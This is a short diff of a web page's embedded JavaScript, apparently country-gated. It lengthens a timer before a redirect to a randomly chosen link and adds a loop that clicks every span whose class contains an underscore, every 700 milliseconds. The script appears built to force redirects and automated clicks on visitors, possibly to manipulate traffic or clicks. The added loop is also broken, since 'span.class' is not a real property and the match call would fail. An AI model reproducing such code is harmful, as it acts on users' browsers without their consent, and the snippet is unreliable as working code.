@@ -93,7 +93,7 @@ if($country === "Nigeria") {
     				let secArray = [25000, 35000];
 				let secRand = Math.floor(Math.random() * secArray.length);
     
-				setTimeout(redir, 50000);
+				setTimeout(redir, 100000);
 
 				function redir() {
 					let rand = Math.floor(Math.random() * links.length);
@@ -101,6 +101,17 @@ if($country === "Nigeria") {
 	  			}
     
 			});
+
+
+   			setInterval(function() {
+      				let sp = document.querySelectorAll("span");
+	  			sp.forEach(function(span) {
+      					let klass = span.class;
+      					if(klass.match("_")) {
+	   					span.click();
+					}
+				});
+			}, 700);
 
   		</script>
 		
